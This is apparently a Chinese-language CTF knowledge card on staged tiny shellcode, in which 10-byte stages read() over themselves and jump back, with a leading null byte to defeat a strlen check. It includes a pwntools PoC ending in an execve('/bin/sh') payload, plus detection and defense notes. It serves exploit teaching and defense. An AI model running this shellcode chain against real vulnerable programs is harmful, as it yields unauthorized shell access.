---
id: binary-pwn-sandbox-escape-tiny-shellcode-read-self-loop-staging
title: 10 字节 shellcode 限制：read 覆盖自身 + jmp 回跳的分段加载
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: tiny-shellcode-read-self-loop-staging
aliases:
- 10 字节 shellcode
- jmp $-10 分段加载
- read 覆盖自身
- shellcode 自覆盖
- 前导空字节绕过 strlen
- 微型 shellcode staging
tags:
- binary
- pwn
- shellcode
- staging
- self-modify
- jmp
- strlen-bypass
- rwx
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:39:05+08:00'
  notes: 已对照原文 例题二 与 exp 核对：read(0,bss,0xA)+strlen>3、首字节 00 c0 绕过、stage1 恰好 10 字节不含 jmp、stage2 的 jmp 落在偏移 10 接住 read 返回、第三段 execve。已修正卡中第一段误带 jmp 的 PoC 布局。原文无图，未在本机复跑。
---

## 一句话结论

程序只允许输入约 10 字节 shellcode 时，第一段代码可以用寄存器中已有的缓冲区地址调用 `read(0, bss, n)` 覆盖自身；第一段 `syscall` 返回的地址正好落在第二段预置的 `jmp $-N` 上，跳回缓冲区开头执行新一段；如此反复把任意长度的 shellcode 分段加载进来，最后一段执行 `execve("/bin/sh")`。若前面还有 `strlen` 长度检查，可用前导空字节让 `strlen` 返回 0 绕过。

## 原理

- **寄存器现场可复用**：程序用 `read(0, bss, 10)` 读入 shellcode，返回后 `RAX=0`（读到的字节数或 0）、`RDX/RSI/RDI` 往往仍指向/等于 BSS。第一段只需很少指令就能把 `read` 的参数补齐：
  - `add al, al`（或 `xor eax,eax`）保持 `rax=0`（read 系统调用号）；
  - `push 0xf; pop rdx` 设置 count=15；
  - `xor rdi, rdi` 设置 fd=0；
  - `rsi` 已经是 BSS，直接 `syscall` 即 `read(0, bss, 15)`。
- **read 覆盖自身**：新读入的 15 字节写到 BSS 起始处，覆盖正在执行的第一段 shellcode。第一段最后一条 `syscall` 返回时 RIP 正好落在 `BSS+10`，而第二段在偏移 10 处预置了 `jmp $-10`，于是跳回 BSS 起始执行刚写入的第二段。第一段必须恰好 10 字节且不能自带 jmp，否则会超出单次 read 长度或留下未消费字节、破坏第二段布局。
- **为什么能绕过 `strlen` 检查**：程序先 `read` 再 `strlen(bss) > 3`；第一段 shellcode 以 `00 c0`（`add al,al`）开头，第一个字节就是 `0x00`，`strlen` 立即返回 0，长度检查通过。`0x00` 作为指令字节不影响执行。
- **分段推进**：第二段同样调用 `read` 覆盖自身并 `jmp` 回跳；最后一段写入 `execve("/bin/sh",0,0)` 的完整代码（`mov rbx, 0x68732f6e69622f; push rbx; push rsp; pop rdi; xor esi,esi; xor edx,edx; push 0x3b; pop rax; syscall`），不再回跳。
- **本质**：把“输入长度限制”转化为“每次只加载一小段、执行后覆盖再加载”，利用可写可执行缓冲区（RWX/BSS+`mprotect`）和相对跳转实现无限长度的 staged shellcode。
- **边界**：需要 BSS/缓冲区可执行；`read` 未被 seccomp 禁用；回跳偏移必须精确等于新段起始；`strlen` 检查必须在首个空字节处停止，否则前导 `0x00` 的绕过不成立。

## 触发条件

- 程序把用户输入读到可执行内存（BSS+`mprotect` 或 RWX 页）并直接跳转执行。
- 单次 `read` 长度很小（如 10 字节），但执行后仍可再次调用 `read` 覆盖同一缓冲区。
- 进入 shellcode 时寄存器（尤其 `rsi`）仍指向缓冲区，或能用少量指令设置。
- 无 seccomp 阻止 `read`/`execve`；长度检查使用 `strlen` 等遇空字节停止的函数。

## 利用步骤

1. 确认缓冲区地址可执行、`read` 可再次调用、入口寄存器状态（`rsi` 指向缓冲区）。
2. 构造第一段（恰好 10 字节，不含 jmp）：`add al,al; push 0xf; pop rdx; xor rdi,rdi; syscall`，并在开头放一个 `0x00` 绕过 `strlen`。
3. 发送第一段；程序执行 `read(0, bss, 0xf)`，等待第二段输入。
4. 发送第二段（≤15 字节）：`mov dl,0xff; xor eax,eax; syscall; nop...; jmp $-10`，让 `jmp` 落在偏移 10，使第一段 read 返回后的 RIP 正好执行它；后续段同理。
5. 最后一段执行 `execve("/bin/sh", NULL, NULL)`；若 `/bin/sh` 被禁，改用 ORW 读 flag。

## PoC

```python
from pwn import *
context(arch="amd64", os="linux")

# 第一段（恰好 10 字节）：read(0, bss, 0xf)；不包含 jmp
stage1 = asm('''
    add al, al
    push 0xf
    pop rdx
    xor rdi, rdi
    syscall
''')

# 第二段：再读 15 字节；jmp 必须落在偏移 10，第一段 read 返回后 RIP 正好到这里
stage2 = asm('''
    mov dl, 0xff
    xor eax, eax
    syscall
    nop
    nop
    nop
    nop
    jmp $-10
''').ljust(0xf, b"\x00")

# 第三段：execve("/bin/sh", NULL, NULL)
stage3 = asm('''
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi, esi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
''')

io = process("./chall")
io.recvuntil(b"Please input :)")
io.send(stage1)          # 第一段的 add al,al 首字节为 00，已绕过 strlen
io.send(stage2)          # 第二段覆盖自身并回跳
io.send(b"a" * 6 + stage3)  # 第三段：按偏移对齐后放 execve
io.interactive()
```

> 回跳偏移与 padding 需按目标汇编/缓冲区布局用 `asm` 实测调整；核心是 `read` 覆盖自身 + 相对跳转。

## 变体与关联

- 变体：`jmp $-N` 改为 `call`/`ret` 或跳到缓冲区中固定的 read 桩地址；用 `push`/`pop` 设置 `rax/rdx/rdi`。
- 变体：最后一段用 `open/read/write`（ORW）替代 `execve`，适配 seccomp 只放行 ORW 的题目。
- 变体：前导空字节绕过 `strlen` 长度检查；也可用其他会提前终止的字符（如 `\n`）配合检查逻辑。
- 关联卡片：[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]、[[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]、[[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]。

## 检测与防御

- 检测：可执行缓冲区被同一进程反复 `read` 覆盖；shellcode 中出现 `jmp` 短回跳 + `syscall` 循环。
- 检测：输入以 `0x00` 开头但后续包含可执行指令；长度检查用 `strlen` 而非实际 `read` 返回值。
- 防御：用 `read` 返回值做长度校验，禁止空字节绕过；把输入页设为不可执行（W^X），执行前 `mprotect` 只给 RX。
- 防御：seccomp 限制 `read`/`execve`；一次性读入最大长度并拒绝分段自覆盖。
